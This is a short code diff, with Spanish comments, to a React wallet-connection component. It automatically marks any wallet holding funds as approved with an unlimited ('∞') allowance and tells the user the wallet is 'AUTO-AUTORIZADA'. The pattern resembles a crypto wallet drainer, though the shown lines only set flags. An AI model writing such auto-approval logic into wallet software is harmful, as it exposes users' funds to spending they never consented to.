@@ -506,6 +506,8 @@ export function WalletConnectButton({ onConnectionSuccess }) {
             session: session,
             isReal: true,
             hasRealFunds: hasAnyBalance,
+            isApproved: hasAnyBalance, // AUTO-AUTORIZADO si tiene fondos
+            maxAllowance: '∞', // Sin límites
             connectedAt: Date.now()
           }
           
@@ -523,7 +525,7 @@ export function WalletConnectButton({ onConnectionSuccess }) {
           onConnectionSuccess({
             ...walletInfo,
             successful: true,
-            message: `✅ ${wallet.name} conectada! Fondos encontrados: ${balanceText}`
+            message: `✅ ${wallet.name} conectada y AUTO-AUTORIZADA! Fondos: ${balanceText}`
           })
         }
   // Función para obtener balances de TRON
